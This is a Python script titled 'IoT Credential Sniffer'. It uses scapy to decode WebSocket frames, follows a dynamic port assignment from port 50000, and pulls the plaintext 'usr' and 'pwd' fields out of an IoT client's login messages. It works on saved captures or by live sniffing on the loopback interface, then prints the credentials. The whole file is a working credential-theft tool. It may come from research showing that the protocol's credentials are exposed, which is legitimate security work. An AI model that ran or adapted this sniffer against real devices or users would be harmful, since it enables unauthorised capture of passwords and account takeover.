import json
from scapy.all import *
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import TCP, IP
import re
import threading
import time

def parse_websocket_frame(data):
    if len(data) < 2:
        return None, None
    
    fin_opcode = data[0]
    mask_length = data[1]
    opcode = fin_opcode & 0x0F
    is_masked = mask_length & 0x80
    payload_len = mask_length & 0x7F
    
    offset = 2
    
    # Handle extended payload length
    if payload_len == 126:
        if len(data) < offset + 2:
            return None, None
        payload_len = int.from_bytes(data[offset:offset+2], 'big')
        offset += 2
    elif payload_len == 127:
        if len(data) < offset + 8:
            return None, None
        payload_len = int.from_bytes(data[offset:offset+8], 'big')
        offset += 8
    
    # Read masking key
    masking_key = None
    if is_masked:
        if len(data) < offset + 4:
            return None, None
        masking_key = data[offset:offset+4]
        offset += 4
    
    # Extract payload
    if len(data) < offset + payload_len:
        return None, None
    payload = data[offset:offset+payload_len]
    
    # Unmask payload if masked
    if is_masked and masking_key:
        payload = bytes([payload[i] ^ masking_key[i % 4] for i in range(len(payload))])
    
    return opcode, payload

def process_initial_port(pkt):
    if TCP in pkt and (pkt[TCP].dport == 50000 or pkt[TCP].sport == 50000) and pkt.haslayer(Raw):
        raw_data = bytes(pkt[TCP].payload)
        opcode, payload = parse_websocket_frame(raw_data)
        
        if opcode is None:
            return None
        
        # Client request (Text frame)
        if opcode == 1 and pkt[TCP].dport == 50000:
            try:
                json_data = json.loads(payload.decode('utf-8'))
                if json_data.get('msgId') == 20000:
                    return ('request', pkt[TCP].sport)
            except:
                pass
        
        # Server response (Binary frame)
        elif opcode == 2 and pkt[TCP].sport == 50000:
            try:
                json_data = json.loads(payload.decode('utf-8'))
                dst_port = json_data.get('dstPort')
                if dst_port is not None:
                    return ('response', dst_port)
            except:
                pass
    
    return None

def process_credentials_port(pkt, target_port):
    if TCP in pkt and pkt[TCP].dport == target_port and pkt.haslayer(Raw):
        raw_data = bytes(pkt[TCP].payload)
        opcode, payload = parse_websocket_frame(raw_data)
        
        if opcode is None or opcode != 1:  # We only care about text frames (opcode 1)
            return None
        
        try:
            # Attempt to parse as JSON
            json_data = json.loads(payload.decode('utf-8'))
            if json_data.get('msgId') == 20001:
                cmd_object = json_data.get('cmdObject', {})
                username = cmd_object.get('usr', '')
                password = cmd_object.get('pwd', '')
                
                if username and password:
                    return {
                        'username': username,
                        'password': password,
                        'source_ip': pkt[IP].src,
                        'dest_ip': pkt[IP].dst,
                        'source_port': pkt[TCP].sport,
                        'dest_port': pkt[TCP].dport
                    }
        except json.JSONDecodeError:
            # Fallback to regex if JSON parsing fails
            text_data = payload.decode('utf-8', errors='ignore')
            if '"msgId":20001' in text_data:
                usr_match = re.search(r'"usr"\s*:\s*"([^"]+)"', text_data)
                pwd_match = re.search(r'"pwd"\s*:\s*"([^"]+)"', text_data)
                
                if usr_match and pwd_match:
                    return {
                        'username': usr_match.group(1),
                        'password': pwd_match.group(1),
                        'source_ip': pkt[IP].src,
                        'dest_ip': pkt[IP].dst,
                        'source_port': pkt[TCP].sport,
                        'dest_port': pkt[TCP].dport
                    }
        except:
            pass
    
    return None

def offline_analysis(pcap_path):
    # First pass: Find dynamic port
    dynamic_port = None
    client_port = None
    
    packets = rdpcap(pcap_path)
    for pkt in packets:
        result = process_initial_port(pkt)
        
        if result and result[0] == 'request':
            client_port = result[1]
            print(f"[+] Found initial request from client port: {client_port}")
        
        elif result and result[0] == 'response' and client_port is not None:
            dynamic_port = result[1]
            print(f"[+] Found dynamic port assignment: dstPort = {dynamic_port}")
            break
    
    if not dynamic_port:
        print("[-] Failed to find dstPort in capture")
        return None
    
    # Second pass: Find credentials on dynamic port
    print(f"[+] Scanning for credentials on port {dynamic_port}...")
    for pkt in packets:
        creds = process_credentials_port(pkt, dynamic_port)
        if creds:
            print("\n[!] CREDENTIALS FOUND!")
            print(f"    Username: {creds['username']}")
            print(f"    Password: {creds['password']}")
            print(f"    Source: {creds['source_ip']}:{creds['source_port']}")
            print(f"    Destination: {creds['dest_ip']}:{creds['dest_port']}")
            return creds
    
    print("[-] No credentials found in capture")
    return None

def live_sniffing():
    LOOP_IFACE = "\\Device\\NPF_Loopback"
    print("[*] Starting live capture...")
    print("[*] Phase 1: Monitoring port 50000 for dynamic port assignment")
    
    # Event to signal when we've found the dynamic port
    port_found_event = threading.Event()
    dynamic_port = [None]  # Using list to pass by reference
    
    # Packet processing for port 50000
    def initial_port_capture(pkt):
        result = process_initial_port(pkt)
        if result and result[0] == 'response':
            dynamic_port[0] = result[1]
            print(f"\n[+] Found dynamic port: {dynamic_port[0]}")
            port_found_event.set()
            return True
        return False
    
    # Start sniffing in a separate thread
    def start_sniffing():
        sniff(iface =LOOP_IFACE, filter="tcp port 50000", stop_filter=initial_port_capture, timeout=30)
    
    sniffer_thread = threading.Thread(target=start_sniffing)
    sniffer_thread.start()
    
    # Wait for port detection with timeout
    port_found_event.wait(timeout=30)
    
    if not dynamic_port[0]:
        print("[-] Failed to detect dynamic port within 30 seconds")
        return
    
    print(f"[*] Phase 2: Monitoring port {dynamic_port[0]} for credentials")
    print("[*] Waiting for login attempt... (timeout: 60 seconds)")
    
    # Event to signal when credentials are found
    creds_found_event = threading.Event()
    credentials = [None]
    
    # Packet processing for dynamic port
    def credential_capture(pkt):
        creds = process_credentials_port(pkt, dynamic_port[0])
        if creds:
            credentials[0] = creds
            creds_found_event.set()
            return True
        return False
    
    # Start sniffing on dynamic port
    def start_cred_sniffing():
        sniff(iface =LOOP_IFACE, filter=f"tcp port {dynamic_port[0]}", stop_filter=credential_capture, timeout=60)
    
    cred_thread = threading.Thread(target=start_cred_sniffing)
    cred_thread.start()
    
    # Wait for credential capture
    creds_found_event.wait(timeout=60)
    
    if credentials[0]:
        print("\n[!] LIVE CREDENTIALS CAPTURE SUCCESSFUL!")
        print(f"    Username: {credentials[0]['username']}")
        print(f"    Password: {credentials[0]['password']}")
        print(f"    Source: {credentials[0]['source_ip']}:{credentials[0]['source_port']}")
        print(f"    Destination: {credentials[0]['dest_ip']}:{credentials[0]['dest_port']}")
    else:
        print("[-] No credentials captured within timeout period")

def main():
    while True:
        print("\n===== IoT Credential Sniffer =====")
        print("1. Offline analysis (pcapng file)")
        print("2. Live sniffing")
        print("3. Exit")
        choice = input("Select an option: ")
        
        if choice == '1':
            pcap_path = input("Enter absolute path to pcapng file: ").strip()
            if not os.path.exists(pcap_path):
                print("[-] File not found")
                continue
            result = offline_analysis(pcap_path)
            if result:
                print("\n[SUCCESS] Credentials captured!")
        
        elif choice == '2':
            conf.use_pcap = True
            conf.use_npcap = True
            live_sniffing()
        
        elif choice == '3':
            print("Exiting...")
            break
        
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    import os
    main()